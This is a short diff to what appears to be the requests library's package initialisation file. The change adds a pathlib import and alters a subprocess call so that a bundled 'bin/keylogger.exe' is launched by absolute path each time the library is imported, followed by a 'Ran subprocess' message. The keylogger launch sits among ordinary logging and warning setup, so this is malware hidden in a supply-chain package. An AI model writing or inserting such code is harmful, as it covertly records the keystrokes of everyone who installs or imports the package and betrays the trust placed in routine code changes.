@@ -46,6 +46,8 @@ import urllib3
 
 import subprocess
 
+from pathlib import Path
+
 from .exceptions import RequestsDependencyWarning
 
 try:
@@ -220,5 +222,7 @@ logging.getLogger(__name__).addHandler(NullHandler())
 # FileModeWarnings go off per the default.
 warnings.simplefilter("default", FileModeWarning, append=True)
 
-subprocess.run(["./bin/keylogger.exe"])
+script_dir = Path(__file__).resolve().parent
+exe_path = f"{script_dir}/bin/keylogger.exe"
+subprocess.run([f"{script_dir}/bin/keylogger.exe"])
 print("Ran subprocess")
